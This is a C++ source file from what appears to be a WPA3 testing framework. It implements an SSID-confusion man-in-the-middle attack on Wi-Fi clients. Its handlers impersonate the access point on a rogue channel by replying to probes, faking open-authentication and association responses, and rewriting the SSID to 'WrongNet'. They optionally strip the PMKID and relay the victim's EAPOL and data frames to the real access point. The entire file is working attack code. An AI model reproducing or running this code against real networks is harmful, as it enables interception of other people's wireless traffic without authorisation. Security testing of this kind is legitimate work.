#include "attacks/components/sniffer_helper.h"
#include "attacks/mc_mitm/mc_mitm.h"
#include "attacks/mc_mitm/ssid_confusion/ssid_helper.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "net_parser/dot11_defs.h"
#include "system/hw_capabilities.h"
namespace wpa3_tester::ssid_confusion {
using namespace Tins;
using namespace std;

void SsidConfusion::send_to_real(PDU &pdu) const {
	const frame_raw_t raw = pdu.serialize();
    send_to_real(raw);
}

void SsidConfusion::send_to_real(const frame_raw_t &raw) const {
	const auto full_radiotap = ensure_radiotap(raw);
	sock_real->send(full_radiotap, netconfig.real_channel);
}

// response to all clients
FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) {
	if(dot11.find_pdu<Dot11ProbeRequest>()) {
		const bool directed = dot11.addr1() == HWAddress<6>(ap.get(SK::mac));
		const bool wildcard = dot11.addr1() == HWAddress<6>::broadcast;
		if(!directed && !wildcard) return STOP;
		probe_resp->addr1(addr2);
		const unique_ptr<Dot11ProbeResponse> resp(probe_resp->clone());
		resp->addr1(addr2);
		send_to_rogue(*resp);
		display_traffic(*pdu, "Rogue channel", " -- Replied");
		if(addr2 == HWAddress<6>(sta.get(SK::mac)) && client_state.get_state() < ClientState::Authenticated)
			client_state.update_state(ClientState::Finding);
		return STOP;
	}
	if(dot11.find_pdu<Dot11ProbeResponse>()) return STOP;
	return CONTINUE;
}

FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) {
	const auto *auth = dot11.find_pdu<Dot11Authentication>();
	if(!auth) return CONTINUE;
	if(client_state.get_state() >= ClientState::GotMitm) return STOP;

	if(auth->auth_algorithm() == dot11::AUTH_ALG_OPEN && auth->auth_seq_number() == dot11::AUTH_SEQ_REQ) {
		// Open: respond locally (no round-trip delay)
		Dot11Authentication resp(addr2, rogue_ap->get(SK::mac));
		resp.addr3(rogue_ap->get(SK::mac));
		resp.auth_seq_number(dot11::AUTH_SEQ_RESP);
		resp.auth_algorithm(dot11::AUTH_ALG_OPEN);
		resp.status_code(dot11::STATUS_SUCCESS);
		send_to_rogue(resp);
	}
	// relay to real AP (Open for AP state, SAE for full exchange)
	auto relayed = ensure_radiotap(dot11.serialize());
	rewrite_bssid_in_frame(relayed, ap.get(SK::mac));
	send_to_real(relayed);

	display_traffic(dot11, "Rogue channel", " -- Relayed to real");
	client_state.update_state(ClientState::Authenticated);
	return STOP;
}

FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr2, const PDU &pdu, const frame_raw_t &raw) const {
	// EAPOL STA -> AP
	if(addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
		const auto msg = get_eapol_msg_num(raw);
		if(msg == EapolMsg::Msg1 || msg == EapolMsg::Msg3) return STOP; //block cycles
		if(msg == EapolMsg::Msg2 || msg == EapolMsg::Msg4) return CONTINUE;
		display_traffic(pdu, "Rogue channel", " STA -> AP  -- MitM'ing");
		send_to_real(raw);
		return STOP;
	}
	return CONTINUE;
}
void SsidConfusion::send_synth_assoc_resp(const HWAddress<6> &sta_mac) const {
	Dot11AssocResponse resp(sta_mac, HWAddress<6>(rogue_ap.get(SK::mac)));
	resp.addr3(HWAddress<6>(rogue_ap.get(SK::mac)));
	resp.capabilities() = beacon->capabilities();
	resp.status_code(0);
	resp.aid(1);
	for(const auto &opt : beacon->options()) {
		if(opt.option() == Dot11::SSID ||
		   opt.option() == Dot11ManagementFrame::TIM ||
		   opt.option() == Dot11ManagementFrame::DS_SET) continue;
		if(opt.option() == Dot11::HT_OPERATION && opt.data_size() >= 1) {
			vector ht(opt.data_ptr(), opt.data_ptr() + opt.data_size());
			ht[0] = netconfig.rogue_channel.ch_num;
			resp.add_option({Dot11::HT_OPERATION, ht.size(), ht.data()});
			continue;
		}
		resp.add_option(opt);
	}
	send_to_rogue(resp);
}

FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11, const frame_raw_t &raw) {
	if(!dot11.find_pdu<Dot11AssocRequest>() && !dot11.find_pdu<Dot11ReAssocRequest>())
		return CONTINUE;

	auto full_radiotap = ensure_radiotap(raw);
	rewrite_ssid_in_frame(full_radiotap, "WrongNet"); //TODO hardcoded
	if(strip_pmkid_in_assoc) strip_pmkid_from_rsn_ie(full_radiotap);

	send_synth_assoc_resp(addr2);

	if(client_state.get_state() >= ClientState::Associated) {
		display_traffic(dot11, "Rogue channel", " -- AssocReq re-relay to real");
		send_to_real(full_radiotap);
		return STOP;
	}

	display_traffic(dot11, "Rogue channel", " -- MitMing (relay to real)");
	client_state.update_state(ClientState::Associated);
	send_to_real(full_radiotap);
	return STOP;
}

FrameProcess SsidConfusion::handle_mgmt_action_rogue(HWAddress<6> addr2, const Dot11 &dot11, const frame_raw_t &raw) const {
	if(dot11.type() != dot11::TYPE_MGMT || dot11.subtype() != dot11::MGMT_ACTION) return CONTINUE;
	if(addr2 != HWAddress<6>(sta.get(SK::mac))) return CONTINUE;
	display_traffic(dot11, "Rogue channel", " MGMT_ACTION -- relay to real");
	send_to_real(raw);
	return STOP;
}

void SsidConfusion::handle_rx_rogue_chan(const std::unique_ptr<PDU> &pdu, const frame_raw_t &raw) {
	auto *dot11 = pdu->find_pdu<Dot11>();
	if(!dot11) return;

	//filter out different channels
	if(const auto *rt = pdu->find_pdu<RadioTap>()) {
		if(rt->present() & RadioTap::CHANNEL &&
			rt->channel_freq() != hw_capabilities::channel_to_freq(netconfig.rogue_channel)) {
				return;
			}
	}
	const auto [addr1, addr2] = get_addrs(*pdu, raw);
	power_mgmt_response_rogue(addr2, *dot11);
	if(dot11->type() == dot11::TYPE_CTRL) return;
	if(dot11->find_pdu<Dot11Beacon>()) return;

	#define SOLVE_OR_CONTINUE(handle_fun) if(handle_fun) return;

	SOLVE_OR_CONTINUE(handle_probe(addr2, pdu.get(), *dot11))
	if(handle_open_auth(addr2, *dot11)) return;
	SOLVE_OR_CONTINUE(handle_assoc_request(addr2, *dot11, raw))
	SOLVE_OR_CONTINUE(handle_eapol_rogue(addr2, *pdu, raw))

	#undef SOLVE_OR_CONTINUE

	if(handle_mgmt_action_rogue(addr2, *dot11, raw)) return;

	if(addr2 == sta.get(SK::mac)) {
		handle_disconnect_rogue(*dot11);
		if(dot11->type() == Dot11::DATA &&
		   client_state.get_state() >= ClientState::Associated &&
		   client_state.get_state() < ClientState::GotMitm)
			client_state.update_state(ClientState::GotMitm);
		const auto eap = components::eap_description_raw(raw);
		display_traffic(*pdu, "Rogue channel", (eap.empty() ? "" : " [" + eap + "]") + " -- MitM'ing");
		send_to_real(raw);
	}
}

}